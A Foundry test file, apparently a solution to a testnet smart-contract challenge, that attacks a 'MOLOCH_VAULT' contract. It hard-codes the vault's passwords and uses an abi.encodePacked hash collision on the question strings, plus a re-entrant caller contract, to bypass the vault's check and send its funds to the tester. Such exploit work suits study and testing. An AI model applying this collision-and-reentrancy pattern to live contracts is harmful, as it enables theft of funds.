// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import "forge-std/Test.sol";
import "../src/MOLOCH_VAULT.sol";
import "../src/MolochCaller.sol";

contract MolochVaultTest is Test {
    MOLOCH_VAULT molochVault;
    address payable vaultAddress =
        payable(0xaFB9ed5cD677a1bD5725Ca5FcB9a3a0572D94f6f);

    // re-entrant exploiter caller
    MolochCaller molochCaller;

    // OSINT Information
    // Source: https://goerli.etherscan.io/address/0xaFB9ed5cD677a1bD5725Ca5FcB9a3a0572D94f6f#code

    // Constructor Arguments:
    // molochPass: The Moloch password
    string molochPass = "BLOODY PHARMACIST";

    // question: The two parts of the question
    string[2] question = ["WHO DO YOU", "SERVE?"];

    // initialCabalsAddresses: The initial addresses for the Cabals
    address payable[3] initialCabalsAddresses = [
        payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4),
        payable(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2),
        payable(0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db)
    ];

    // initialCabalsPasswords: The initial passwords for the Cabals
    string[3] initialCabalsPasswords = [
        "KCLEQ",
        "BGTGJQNGP",
        "ZJQQBW*NFCPKCAKQR"
    ];

    // Deployment Transaction:
    // https://goerli.etherscan.io/tx/0x72049d23504379883f2dbd9265bb80ef0031beb2f3d12e18865ca4a2c7a63390

    // Vault Deployer Address
    address deployer = 0x6c3b4b9f3B27fA64dEB63962e49Fc582f5187E05;

    // Moloch Hash
    bytes32 Moloch;

    // hsah Hash
    bytes32 hsah;

    // hy7UIH Hash
    bytes32 hy7UIH;

    function setUp() public {
        vm.deal(msg.sender, 1 ether);
        molochVault = MOLOCH_VAULT(vaultAddress);
        // calculating constructor immutable variables
        Moloch = calculateMolochHash(address(deployer));
        hsah = keccak256(abi.encodePacked(molochPass));
        hy7UIH = keccak256(abi.encodePacked(question[0], question[1]));
        molochCaller = new MolochCaller(payable(address(molochVault)));
        molochCaller.deposit{value: 3 wei}();
    }

    function testHack() public {
        string[2] memory differentQuestion = ["WHO DO ", "YOUSERVE?"];
        string[3] memory _openSecrete = [
            molochPass,
            differentQuestion[0],
            differentQuestion[1]
        ];
        molochCaller.callUhER778(_openSecrete);
        molochCaller.callSendGrant(msg.sender);
    }

    function calculateMolochHash(address addr) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(addr));
    }
}
